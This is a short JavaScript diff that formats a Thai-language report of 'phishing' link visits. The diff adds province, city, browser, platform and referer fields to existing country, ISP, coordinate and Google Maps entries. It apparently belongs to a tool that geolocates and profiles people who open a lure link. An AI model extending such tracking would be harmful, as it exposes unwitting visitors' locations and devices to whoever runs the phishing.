@@ -931,7 +931,12 @@ visits.forEach((visit, idx) => {
   msg += `├ เวลาเข้าชม: ${formatPhishingVisitTime(visit)}\n`;
   msg += `├ ประเทศ: ${visit.country || '-'}\n`;
   msg += `├ เครือข่าย: ${visit.isp || '-'}\n`;
-
+  msg += `├ จังหวัด: ${visit.state || '-'}\n`;
+  msg += `├ เมือง: ${visit.city || '-'}\n`;
+  msg += `├ Browser: ${visit.browser || '-'}\n`;
+  msg += `├ Platform: ${visit.platform || '-'}\n`;
+  msg += `├ Referer: ${visit.referer || '-'}\n`;
+  
   if (visit.lat && visit.lng) {
     msg += `├ พิกัด: ${visit.lat},${visit.lng}\n`;
     msg += `╰ Google map: https://www.google.com/maps?q=${visit.lat},${visit.lng}\n\n`;
